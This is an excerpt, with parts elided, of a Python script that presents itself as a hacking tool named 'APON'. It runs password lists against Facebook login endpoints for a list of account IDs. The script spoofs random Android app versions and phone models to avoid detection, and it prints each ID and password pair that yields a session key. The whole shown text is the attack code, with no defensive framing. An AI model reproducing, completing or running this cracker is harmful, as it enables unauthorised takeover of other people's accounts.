...
##     ## ##         #######  ##    ## 
     ...
     │ [💸] VERSION  : A.1                 │
     │ [💸] HACKED   : \033[1;32m APON \033[1;37m              │
     └───────────────────────────────────────┘""")
def linex():
	print(50*'_')
def clear():
...
def menu():
		...
		#	os.system('xdg-open https://www.facebook.com/crazehacker2000)
			if xd in ['1','01']:
				clear()
				print(' Put file example:  /sdcard/APON.txt  etc..')
				linex()
...
def APON2(ids,passlist):
	...
	try:
		for pas in passlist:
			sys.stdout.write('\r\r\033[1;37m [APON-RANDOM] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
			application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
			application_version_code=str(random.randint(000000000,999999999))
			__iam_genius = random.choice(android_models)
			phone_model = __iam_genius.split('|')[0]
			...
			if 'session_key' in q:
				udx = str(q['uid'])
				print('\r\r\033[1;32m [APON-OK] '+udx+' | '+pas+'\033[1;97m')
...
def APON6(ids,passlist):
	...
	try:
		for pas in passlist:
			...
			"pass":ps,
			"login":"Log In"}
			headers_freefb= {'authority': 'p.facebook.com',
